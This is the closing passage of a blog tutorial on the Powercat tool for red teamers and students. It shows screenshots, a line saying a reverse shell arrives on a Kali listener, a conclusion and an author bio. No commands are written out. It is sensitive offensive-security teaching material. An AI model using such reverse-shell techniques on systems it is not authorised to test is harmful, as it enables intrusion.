<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEh_PgKBxGRVuubRUXpbE1ZJE8QfxIUstJlk1DF-ZsMP0t3cBz7lYng2shcVa3kaP18V5iVR7VjwkqaYNnusICxkXHY-oZ8VtLR5NlzqTAKXd_Sb6ejFIXs05Y9TCi32sSXN4XGPuOq88T17lbnN4V9JZ93Uz59B2oONHfiWxJkEWM0mfYXG4tp5y-TU-w=s16000"/></strong></span></p>
<p><span style="color: #000000;">Soon as we hit enter, we’ll receive a reverse shell on the listener running in Kali.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgp7NgK0f1AvUmwEtKCobeK-0l0dfY_fZsZDPwwb3u3Fqb_76i1digXlyrpjKnE4UMU5lm-WDXoqCpvCq-w9XEpM3kEZfioieyD6vm_LHn-PMBEKDGNYBPgCT9oggH-rwnUwUoznzqT7w01KI9pR-19_LzUc_bjphnU2MGs8l6Bh0VZ_8T00oq3RgE8Hg=s16000"/></span></p>
<h3><span style="color: #800000;">Conclusion</span></h3>
<p><span style="color: #000000;">In conclusion, we have demonstrated multiple <strong data-start="2113" data-end="2141">Powercat functionalities</strong> in this article. Today, red teamers <strong data-start="2178" data-end="2206">frequently use this tool</strong> in real-world <strong data-start="2221" data-end="2245">red team assessments</strong>, and it’s becoming a staple in several <strong data-start="2285" data-end="2325">cybersecurity certification programs</strong>. Hopefully, this article helps <strong data-start="2357" data-end="2406">aspiring analysts, students, or professionals</strong> understand Powercat in a simple yet practical way. Thanks again for reading.</span></p>
<p><span style="color: #000000;"><strong>Author: Harshit Rajpal </strong>is an InfoSec researcher and left and right brain thinker. Contact</span><strong> <a class="broken_link" href="https://in.linkedin.com/in/harshit-rajpal-79bb43103">here</a></strong></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-related-none yarpp-template-thumbnails">
